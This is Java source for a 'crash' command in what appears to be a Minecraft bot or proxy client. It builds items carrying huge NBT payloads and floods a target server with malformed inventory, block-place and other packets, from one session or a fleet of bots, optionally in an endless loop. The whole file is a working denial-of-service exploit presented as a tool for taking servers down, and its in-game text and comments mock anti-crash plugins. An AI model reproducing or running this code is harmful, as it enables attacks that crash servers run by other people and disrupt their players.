package ru.crashdami.emortality.command.commands;

import org.spacehq.mc.protocol.data.game.ItemStack;
import org.spacehq.mc.protocol.data.game.Position;
import org.spacehq.mc.protocol.data.game.values.Face;
import org.spacehq.mc.protocol.data.game.values.window.ClickItemParam;
import org.spacehq.mc.protocol.data.game.values.window.WindowAction;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientChangeHeldItemPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerPlaceBlockPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientSwingArmPacket;
import org.spacehq.mc.protocol.packet.ingame.client.window.ClientCreativeInventoryActionPacket;
import org.spacehq.mc.protocol.packet.ingame.client.window.ClientWindowActionPacket;
import org.spacehq.opennbt.tag.builtin.*;
import org.spacehq.packetlib.packet.Packet;
import ru.crashdami.emortality.Group;
import ru.crashdami.emortality.objects.Bot;
import ru.crashdami.emortality.objects.Player;
import ru.crashdami.emortality.command.Command;
import ru.crashdami.emortality.types.CrashType;

import java.util.ArrayList;
import java.util.List;

public class CrashCommand extends Command {

    private ItemStack isBeacon;
    private ItemStack isBook;
    private ItemStack isByte;
    public CrashCommand() {
        super("crash", "Положи сервер!", ",crash [количество пакетов] [boty/игрок-true/false] [infinite-true/false] [интервал в секундах] &b[&bтип&b (swingarm,windowclick,blockplace,setcreativeslot,helditem) [item: beacon/book/byte] ",
                Group.USER, "krasz", "lag");

        final CompoundTag nbtB = new CompoundTag("display");
        final List<Tag> tagsB = new ArrayList<>();
        for (int i = 0; i < 500000; i++)
            tagsB.add(new StringTag("-________- jebac xprotector =3"));
        final ListTag listTagB = new ListTag("Lore", tagsB);
        isBeacon = new ItemStack(137, 64, 0, nbtB);
        isBeacon.getNBT().put(listTagB);

        final CompoundTag nbt2 = new CompoundTag(""); //usunieto 'ench'
        final List<Tag> tags2 = new ArrayList<>();
        for (int i = 0; i < 10000; i++)
            tags2.add(new StringTag("-________- jebac антикрашерки =3"));
        final ListTag listTag2 = new ListTag("pages", tags2);
        isBook = new ItemStack(386, 64, 0, nbt2);
        isBook.getNBT().put(listTag2);

        final CompoundTag nbt = new CompoundTag("ench");
        final List<Tag> tags = new ArrayList<>();
        for (int i = 0; i < 20000; i++)
            tags.add(new ByteTag("END"));
        final ListTag listTag = new ListTag("END", tags);
        isByte = new ItemStack(386, 64, 0, nbt);
        isByte.getNBT().put(listTag);
    }

    @Override
    public void onCommand(Player p, Command command, String[] args) {

        //testy
        if (args.length == 2) {
            if (p.getSessionConnect() != null) {
                p.sendMessage("$p &bWysylam...");
                final int am = Integer.parseInt(args[1]);
                for (int i = 0; i < am; i++)
                    p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, isByte,
                            WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
            } else {
                p.sendMessage("$p &cВы не подключены ни к одному серверу!");
            }
            return;
        }

        if (args.length == 0 || args.length < 7) {
            p.sendMessage("$p &7Правильное использование: &b" + getUsage());
            return;
        } else {
            if (!p.isConnected()) {
                p.sendMessage("$p &cВы не подключены к серверу!");
                return;
            }
            final Integer packets = Integer.parseInt(args[1]);
            final Boolean bots = Boolean.parseBoolean(args[2]);
            final Boolean infinite = Boolean.parseBoolean(args[3]);
            final int seconds = Integer.parseInt(args[4]);
            final String item = args[6];
            final CrashType crashType;
            //troche pojebane
            if (args[5].contains("swingarm") || args[5].contains("armanimation")) {
                crashType = CrashType.SWINGARM;
            } else if (args[5].contains("windowclick") || args[5].contains("window")) {
                crashType = CrashType.WINDOW;
            } else if (args[5].contains("place") || args[5].contains("blockplace")) {
                crashType = CrashType.PLACE;
            } else if (args[5].contains("helditem") || args[5].contains("changehelditem") || args[5].contains("slotchange")) {
                crashType = CrashType.CHANGE_HELD_ITEM;
            } else if (args[5].contains("setcreativeslot") || args[5].contains("creativewindowclick")) {
                crashType = CrashType.SET_CREATIVE_SLOT;
            } else {
                p.sendMessage("$p &cНеправильный тип крашера. Типы крашеров: &7swingarm, windowclick, blockplace, setcreativeslot, helditem");
                return;
            }
            if (bots) {
                if (p.getBots().size() < 1) {
                    p.sendMessage("$p &cВы еще не запустили не одного бота!");
                    return;
                }
            }
            p.sendMessage("$p &7Метод краш-теста &b" + crashType.name()
                    + "&7, &7Количество пакетов: &b" + args[1] + "&7, сессии: &b" + (bots ? "boty" : "gracz"));
            if (infinite) {
                final Thread t = new Thread(() -> {
                    //troche pojebane
                    ItemStack crashItem = isBeacon;
                    if (crashType.hasItem()) {
                        if (item.equalsIgnoreCase("book")) {
                            crashItem = isBook;
                        } else if (item.equalsIgnoreCase("byte")) {
                            crashItem = isByte;
                        }
                    }
                    final Packet packet;
                    if (crashType == CrashType.PLACE)
                        packet = new ClientPlayerPlaceBlockPacket(new Position(
                                p.getPosition().getX(), p.getPosition().getY(), p.getPosition().getZ()),
                                Face.NORTH, crashItem, 1.0F,
                                1.0F, 1.0F);
                    else if (crashType == CrashType.WINDOW)
                        packet = new ClientWindowActionPacket(0, 1, 1,
                                crashItem,
                                WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK);

                    else if (crashType == CrashType.SET_CREATIVE_SLOT)
                        packet = new ClientCreativeInventoryActionPacket(1, crashItem);

                    else if (crashType == CrashType.CHANGE_HELD_ITEM)
                        packet = new ClientChangeHeldItemPacket(5);

                    else
                        packet = new ClientSwingArmPacket();

                    while (true) {
                        if (bots) {
                            //raczej sprawdzanie tutaj czy wielkosc listy botow jest rowna 0 i stopowanie threada niepotrzebne
                            crashBots(p, packets, packet);
                        } else {
                            if (p.getSessionConnect() == null || !p.isConnected()) {
                                p.sendMessage("$p &cОстановка крашера...");
                                Thread.currentThread().stop();
                                return;
                            }
                            p.sendMessage("$p &bКраш..");
                            crash(p, packets, packet);
                        }

                        try {
                            Thread.sleep(1000L * seconds);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                });
                t.start();
                if (bots)
                    p.crashBotsThread = t;

                else
                    p.crashPlayerThread = t;

            } else {
                //troche pojebane
                ItemStack crashItem = isBeacon;
                if (crashType.hasItem()) {
                    if (item.equalsIgnoreCase("book")) {
                        crashItem = isBook;
                    } else if (item.equalsIgnoreCase("byte")) {
                        crashItem = isByte;
                    }
                }
                final Packet packet;
                if (crashType == CrashType.PLACE)
                    packet = new ClientPlayerPlaceBlockPacket(new Position(
                            p.getPosition().getX(), p.getPosition().getY(), p.getPosition().getZ()),
                            Face.NORTH, crashItem, 1.0F,
                            1.0F, 1.0F);
                else if (crashType == CrashType.WINDOW)
                    packet = new ClientWindowActionPacket(0, 1, 1,
                            crashItem,
                            WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK);

                else if (crashType == CrashType.SET_CREATIVE_SLOT)
                    packet = new ClientCreativeInventoryActionPacket(1, crashItem);

                else if (crashType == CrashType.CHANGE_HELD_ITEM)
                    packet = new ClientChangeHeldItemPacket(5);

                else
                    packet = new ClientSwingArmPacket();

                if (bots)
                    crashBots(p, packets, packet);
                else
                    crash(p, packets, packet);
            }
        }
    }

    private void crash(Player p, Integer packets, Packet packet) {
        for (int i = 0; i < packets; i++) {
            if (!p.isConnected() || p.getSessionConnect() == null) break;
            //p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, is,
            //       WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
            p.getSessionConnect().send(packet);
        }
    }

    private void crashBots(Player p, Integer packets, Packet packet) {
        for (int i = 0; i < packets; i++) {
            for (Bot bot : p.getBots()) {
                //bot.getSession().send(new ClientWindowActionPacket(0, 1, 1, is,
                //        WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
                bot.getSession().send(packet);
            }
        }
    }

}